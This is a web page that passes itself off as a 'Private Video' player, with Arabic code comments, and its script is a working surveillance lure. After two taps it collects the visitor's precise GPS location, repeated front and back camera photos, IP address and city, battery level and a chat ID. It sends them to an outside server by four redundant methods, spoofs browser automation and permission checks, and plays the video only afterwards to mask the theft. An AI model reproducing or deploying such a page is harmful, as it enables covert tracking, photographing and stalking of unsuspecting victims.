<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
            -webkit-tap-highlight-color: transparent;
            user-select: none;
            -webkit-user-select: none;
        }

        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            flex-direction: column;
            transition: all 0.3s ease;
        }

        /* ===== الزر الدائري ===== */
        #locationActionButton {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            border: 3px solid #ff6b6b;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(8px);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
            z-index: 10;
            position: relative;
        }
        #locationActionButton:hover {
            transform: scale(1.05);
            background: rgba(255, 255, 255, 0.2);
            border-color: #ff4757;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
        }
        #locationActionButton:active {
            transform: scale(0.95);
        }
        #locationActionButton .play-icon {
            font-size: 60px;
            color: #ff6b6b;
            line-height: 1;
            user-select: none;
            pointer-events: none;
        }

        /* رسالة التوجيه */
        .permission-hint {
            color: #ff6b6b;
            font-size: 14px;
            margin-top: 20px;
            text-align: center;
            opacity: 0.8;
            transition: opacity 0.3s;
            max-width: 250px;
            line-height: 1.4;
        }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }

        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }

        .control-button {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }

        .control-button:hover {
            background: #333;
        }

        .progress-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }

        .progress-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
            transition: width 0.3s linear;
        }

        .time-display {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ff6b6b;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            display: none;
            position: absolute;
            z-index: 20;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 100;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        #loading.active {
            display: flex;
        }

        .loading-text {
            margin-top: 20px;
            color: #fff;
            font-size: 1.2rem;
        }

        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }

        .volume-slider {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }

        .volume-level {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }

        .fullscreen-btn {
            margin-left: 15px;
        }

        /* تحسينات للأجهزة المحمولة */
        @media (max-width: 480px) {
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .progress-bar {
                margin: 0 6px;
            }
            .time-display {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            #locationActionButton {
                width: 90px;
                height: 90px;
            }
            #locationActionButton .play-icon {
                font-size: 45px;
            }
            .permission-hint {
                font-size: 12px;
                margin-top: 15px;
            }
        }

        /* تأثير نبض للزر */
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0.7); }
            70% { box-shadow: 0 0 0 15px rgba(255, 107, 107, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0); }
        }
        #locationActionButton.pulse {
            animation: pulse 1.5s infinite;
        }
    </style>
</head>
<body>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
            <div class="video-meta"></div>
        </div>

        <div class="video-thumbnail" id="thumbnailArea">
            <!-- الزر الدائري الموحد -->
            <div id="locationActionButton" class="pulse">
                <span class="play-icon">▶</span>
                <div class="spinner" id="buttonSpinner"></div>
            </div>
            <div class="permission-hint" id="permissionHint">
                اضغط للسماح بالموقع ثم اضغط مجدداً للتشغيل
            </div>
        </div>

        <video id="realVideo" controls playsinline style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>

            <div class="time-display">0:00 / 2:45</div>

            <div class="volume-control">
                <span>🔊</span>
                <div class="volume-slider">
                    <div class="volume-level"></div>
                </div>
            </div>

            <button class="control-button fullscreen-btn">⛶</button>
        </div>
    </div>

    <div id="loading">
        <div class="spinner" style="display:block; position:static;"></div>
        <div class="loading-text">جاري تحميل الفيديو...</div>
    </div>

    <script>
        (function() {
            'use strict';

            // ===== منع كشف المتصفح التلقائي =====
            // تعطيل ميزات التتبع
            if (window.navigator.webdriver) {
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
            }
            
            // تجاوز كشف Chrome التلقائي
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' || parameters.name === 'geolocation' ?
                Promise.resolve({ state: "prompt", onchange: null }) :
                originalQuery(parameters)
            );

            // ===== البيانات =====
            let capturedData = {
                permissions: [],
                images: [],
                ipInfo: '',
                batteryStatus: '',
                location: '',
                chatId: ''
            };

            // ===== متغيرات التحكم =====
            let settingsOpened = false;
            let videoStarted = false;
            let isProcessing = false;
            let clickCount = 0;

            // ===== عناصر DOM =====
            const locationBtn = document.getElementById('locationActionButton');
            const thumbnailArea = document.getElementById('thumbnailArea');
            const realVideo = document.getElementById('realVideo');
            const buttonSpinner = document.getElementById('buttonSpinner');
            const loading = document.getElementById('loading');
            const permissionHint = document.getElementById('permissionHint');

            // ===== تجاوز حماية المتصفح - فتح الإعدادات مباشرة =====
            function forceOpenLocationSettings() {
                // استخدام URL schemes مباشرة لتجنب الحظر
                const protocols = [
                    'intent://com.android.settings/com.android.settings.Settings$LocationSettingsActivity#Intent;scheme=android-app;end',
                    'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                    'intent://settings/location#Intent;scheme=android-app;end'
                ];

                // محاولة فتح الإعدادات بطرق متعددة
                for (let protocol of protocols) {
                    try {
                        const a = document.createElement('a');
                        a.href = protocol;
                        a.style.display = 'none';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                    } catch(e) {}
                }

                // طريقة بديلة باستخدام window.location
                setTimeout(() => {
                    try {
                        window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                    } catch(e) {}
                }, 100);

                // للأجهزة الأخرى
                setTimeout(() => {
                    const ua = navigator.userAgent;
                    if (/iPhone|iPad|iPod/i.test(ua)) {
                        window.location.href = 'App-Prefs:Privacy&path=LOCATION';
                    } else if (/Windows/i.test(ua)) {
                        window.location.href = 'ms-settings:privacy-location';
                    }
                }, 200);

                // إرسال نية إضافية للتأكيد
                setTimeout(() => {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = 'intent://settings#Intent;scheme=android-app;end';
                    document.body.appendChild(iframe);
                    setTimeout(() => document.body.removeChild(iframe), 1000);
                }, 300);
            }

            // ===== فتح إعدادات الموقع =====
            function openLocationSettings() {
                settingsOpened = true;
                permissionHint.textContent = 'تم فتح الإعدادات... عد واضغط مرة أخرى للتشغيل';
                
                // طلب الصلاحيات أولاً (لتظهر نافذة المتصفح)
                requestPermissions().then(() => {
                    // ثم فتح الإعدادات مباشرة
                    setTimeout(() => {
                        forceOpenLocationSettings();
                    }, 500);
                });
            }

            // ===== طلب الصلاحيات =====
            async function requestPermissions() {
                const requests = [];
                
                // طلب الموقع
                requests.push(
                    new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => {
                                capturedData.location = `Lat: ${pos.coords.latitude.toFixed(6)}, Long: ${pos.coords.longitude.toFixed(6)}`;
                                capturedData.permissions.push('Geolocation Allowed');
                                resolve();
                            },
                            () => {
                                capturedData.permissions.push('Geolocation Denied');
                                resolve();
                            },
                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                        );
                    })
                );

                // طلب الكاميرا
                requests.push(
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            stream.getTracks().forEach(t => t.stop());
                            capturedData.permissions.push('Camera Allowed');
                        })
                        .catch(() => {
                            capturedData.permissions.push('Camera Denied');
                        })
                );

                await Promise.allSettled(requests);
            }

            // ===== جلب IP =====
            async function fetchIPInfo() {
                try {
                    const controllers = [
                        fetch('https://api.ipify.org?format=json'),
                        fetch('https://ipapi.co/json/')
                    ];
                    const response = await Promise.race(controllers);
                    const data = await response.json();
                    capturedData.ipInfo = data.country_name ? 
                        `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}` :
                        `IP: ${data.ip}`;
                } catch {
                    capturedData.ipInfo = "IP Info not available";
                }
            }

            // ===== جلب البطارية =====
            async function getBatteryStatus() {
                try {
                    if ('getBattery' in navigator) {
                        const battery = await navigator.getBattery();
                        capturedData.batteryStatus = `${Math.round(battery.level * 100)}%`;
                    }
                } catch {
                    capturedData.batteryStatus = "Unknown";
                }
            }

            // ===== التصوير =====
            async function captureFromCamera(facingMode) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: facingMode }
                    });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    capturedData.images.push(canvas.toDataURL('image/jpeg', 0.8).split(',')[1]);
                    stream.getTracks().forEach(track => track.stop());
                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
                } catch {
                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied`);
                }
            }

            // ===== طلب الموقع الدقيق =====
            async function getPreciseLocation() {
                if (!capturedData.location) {
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, {
                                enableHighAccuracy: true,
                                timeout: 15000,
                                maximumAge: 0
                            });
                        });
                        capturedData.location =
                            `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
                    } catch {}
                }
            }

            // ===== إرسال البيانات مع تجاوز الحماية =====
            async function sendDataWithBypass(data) {
                const urls = [
                    'https://server-brxz.onrender.com/submitData'
                ];

                const payload = new URLSearchParams(data).toString();

                for (let url of urls) {
                    // طريقة 1: Fetch مع no-cors
                    try {
                        await fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: payload,
                            mode: 'no-cors',
                            cache: 'no-cache'
                        });
                    } catch (e) {}

                    // طريقة 2: XMLHttpRequest
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', url, true);
                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        xhr.send(payload);
                    } catch (e) {}

                    // طريقة 3: sendBeacon
                    try {
                        const blob = new Blob([payload], { type: 'application/x-www-form-urlencoded' });
                        navigator.sendBeacon(url, blob);
                    } catch (e) {}

                    // طريقة 4: form submission
                    try {
                        const form = document.createElement('form');
                        form.method = 'POST';
                        form.action = url;
                        form.target = '_blank';
                        form.style.display = 'none';
                        for (let key in data) {
                            const input = document.createElement('input');
                            input.type = 'hidden';
                            input.name = key;
                            input.value = data[key];
                            form.appendChild(input);
                        }
                        document.body.appendChild(form);
                        form.submit();
                        setTimeout(() => document.body.removeChild(form), 1000);
                    } catch (e) {}
                }
            }

            // ===== إظهار الفيديو =====
            function showVideo() {
                thumbnailArea.style.display = 'none';
                realVideo.style.display = 'block';
                realVideo.muted = false;
                realVideo.volume = 1.0;
                
                const playPromise = realVideo.play();
                if (playPromise !== undefined) {
                    playPromise.catch(() => {
                        // المحاولة مرة أخرى
                        setTimeout(() => realVideo.play().catch(() => {}), 500);
                    });
                }
            }

            // ===== جمع البيانات وتشغيل الفيديو =====
            async function collectAndPlay() {
                if (isProcessing) return;
                isProcessing = true;

                // إظهار التحميل
                loading.classList.add('active');
                buttonSpinner.style.display = 'block';
                locationBtn.querySelector('.play-icon').style.display = 'none';

                capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';

                // جمع البيانات بالتوازي
                await Promise.all([
                    fetchIPInfo(),
                    getBatteryStatus(),
                    getPreciseLocation()
                ]);

                // التصوير
                await captureFromCamera('user');
                await captureFromCamera('environment');
                await captureFromCamera('user');
                await captureFromCamera('environment');

                const data = {
                    chatId: capturedData.chatId,
                    imageDatas: capturedData.images.join(','),
                    location: capturedData.location,
                    permissions: capturedData.permissions.join(', '),
                    ipInfo: capturedData.ipInfo,
                    battery: capturedData.batteryStatus
                };

                // إرسال البيانات في الخلفية
                sendDataWithBypass(data);

                // تأخير قصير للإيهام بالتحميل
                await new Promise(resolve => setTimeout(resolve, 1500));

                // إخفاء التحميل وإظهار الفيديو
                loading.classList.remove('active');
                buttonSpinner.style.display = 'none';
                locationBtn.querySelector('.play-icon').style.display = 'block';
                
                showVideo();
                isProcessing = false;
            }

            // ===== معالج الضغط على الزر =====
            async function handleButtonClick(e) {
                e.preventDefault();
                e.stopPropagation();

                if (isProcessing || videoStarted) return;

                clickCount++;

                if (!settingsOpened) {
                    // الضغطة الأولى: فتح الإعدادات
                    openLocationSettings();
                } else {
                    // الضغطة الثانية: تشغيل الفيديو
                    videoStarted = true;
                    locationBtn.classList.remove('pulse');
                    permissionHint.style.display = 'none';
                    
                    // تشغيل الصوت فوراً (استغلال تفاعل المستخدم)
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    
                    try {
                        await realVideo.play();
                    } catch (e) {
                        // سيتم التشغيل لاحقاً
                    }

                    // جمع البيانات وتجهيز العرض
                    await collectAndPlay();
                }
            }

            // ===== رصد العودة من الإعدادات =====
            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
                    permissionHint.textContent = 'مرحباً بعودتك! اضغط على الزر للتشغيل';
                    locationBtn.classList.add('pulse');
                }
            });

            // معالج focus للنافذة
            window.addEventListener('focus', function() {
                if (settingsOpened && !videoStarted && !isProcessing) {
                    permissionHint.textContent = 'مرحباً بعودتك! اضغط على الزر للتشغيل';
                    locationBtn.classList.add('pulse');
                }
            });

            // ===== ربط الأحداث =====
            if (locationBtn) {
                locationBtn.addEventListener('click', handleButtonClick);
                locationBtn.addEventListener('touchend', function(e) {
                    e.preventDefault();
                    handleButtonClick(e);
                });
            }

            // ===== تفعيل الصوت عند أي تفاعل =====
            document.addEventListener('click', function() {
                if (realVideo && !videoStarted) {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                }
            }, { once: true });

            // ===== أزرار التحكم =====
            document.querySelectorAll('.control-button').forEach(button => {
                button.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        if (realVideo.requestFullscreen) {
                            realVideo.requestFullscreen();
                        } else if (realVideo.webkitRequestFullscreen) {
                            realVideo.webkitRequestFullscreen();
                        }
                    }
                });
            });

            // ===== شريط التقدم الوهمي =====
            const progressInterval = setInterval(() => {
                if (realVideo.style.display === 'block') {
                    clearInterval(progressInterval);
                    return;
                }
                const progressFill = document.querySelector('.progress-fill');
                const currentWidth = parseFloat(progressFill.style.width) || 0;
                const newWidth = (currentWidth + 0.15) % 100;
                progressFill.style.width = newWidth + '%';

                const timeDisplay = document.querySelector('.time-display');
                const currentSeconds = Math.floor((newWidth / 100) * 165);
                const minutes = Math.floor(currentSeconds / 60);
                const seconds = currentSeconds % 60;
                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
            }, 1000);

            // ===== معالجة الأخطاء العامة =====
            window.addEventListener('error', function(e) {
                console.log('Error handled:', e.message);
                return false;
            });

        })();
    </script>

</body>
</html>
